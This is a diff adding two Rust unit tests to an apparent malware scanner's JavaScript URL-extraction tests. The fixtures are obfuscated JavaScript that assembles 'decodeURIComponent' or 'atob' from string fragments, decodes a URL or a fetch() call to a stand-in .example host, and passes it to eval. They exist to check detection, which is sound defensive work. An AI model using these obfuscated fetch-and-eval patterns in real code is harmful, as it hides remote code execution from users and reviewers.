@@ -9377,6 +9377,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_variable_member_decodeuricomponent_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var f = "decode" + "URIComponent"; var e = "https%3A%2F%2Fmember-decode-js.example%2Fp"; var u = window[f](e); eval(u)"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://member-decode-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS variable member decodeURIComponent URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_decodeuri_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js = br#"eval(decodeURI("https%3A%2F%2Fdecodeuri-js.example%2Fp"))"#.to_vec();
@@ -9788,6 +9807,30 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS window.atob variable payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_variable_member_atob_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://member-atob-var-js.example/p')",
+        );
+        let js =
+            format!(r#"var f = "a" + "tob"; var b = "{encoded}"; var u = window[f](b); eval(u)"#)
+                .into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://member-atob-var-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS variable member atob payload URL missed: {:?}",
             env.traits
         );
     }
